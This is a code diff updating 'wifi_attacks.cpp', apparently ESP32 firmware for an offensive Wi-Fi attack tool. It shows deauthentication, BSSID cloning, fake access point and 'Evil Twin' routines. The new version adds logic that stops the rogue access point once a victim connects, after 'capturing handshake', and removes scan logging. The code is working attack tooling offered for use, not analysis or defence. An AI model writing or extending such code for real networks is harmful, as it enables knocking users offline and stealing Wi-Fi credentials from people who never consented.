@@ -1,5 +1,5 @@
 // ============================================================
-// wifi_attacks.cpp - v4.4 Guard Edition
+// wifi_attacks.cpp - v4.5 Auto-Stop Edition
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -149,7 +149,6 @@ static bool isSoftAPActive() {
 
 void scanNetworks() {
     networkCount = 0;
-    Serial.println("[WiFi] Starting FAST sync network scan...");
 
     wifi_mode_t modeBefore = WiFi.getMode();
     if (modeBefore == WIFI_AP) {
@@ -158,7 +157,6 @@ void scanNetworks() {
     }
 
     int n = WiFi.scanNetworks(false, true, false, 150);
-    Serial.printf("[WiFi] Scan found %d networks\n", n);
 
     if (n > 0) {
         networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
@@ -271,7 +269,7 @@ void stopBssidClone() {
 }
 
 void startDeauth(uint8_t networkIndex) {
-    if (deauthActive) return; // TRAVA: Não inicia se já estiver rodando
+    if (deauthActive) return; 
     if (networkIndex >= networkCount) return;
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
@@ -293,6 +291,20 @@ void stopDeauth() {
 
 bool deauthLoop() {
     if (!deauthActive) return false;
+
+    // ==========================================
+    // AUTO-STOP DO EVIL TWIN
+    // Se alguém conectar no Evil Twin, espera 3s e volta para CrazyCat
+    // ==========================================
+    if (evilTwinActive) {
+        if (WiFi.softAPgetStationNum() > 0) {
+            Serial.println("[EvilTwin] Cliente conectou! Capturando handshake e voltando para CrazyCat...");
+            delay(3000); 
+            stopEvilTwin(); 
+            return false;
+        }
+    }
+
     deauthBurst();
 
     static unsigned long lastHealthCheck = 0;
@@ -343,7 +355,7 @@ void stopFakeAP() {
 bool isFakeAPActive() { return fakeAPEnabled; }
 
 void startEvilTwin(uint8_t networkIndex) {
-    if (evilTwinActive) return; // TRAVA: Não inicia se já estiver rodando
+    if (evilTwinActive) return; 
     
     if (networkIndex >= networkCount) return;
 
@@ -407,7 +419,7 @@ void startEvilTwin(uint8_t networkIndex) {
 }
 
 void stopEvilTwin() {
-    if (!evilTwinActive) return; // TRAVA
+    if (!evilTwinActive && !deauthActive) return; 
     
     deauthActive = false;
     evilTwinActive = false;
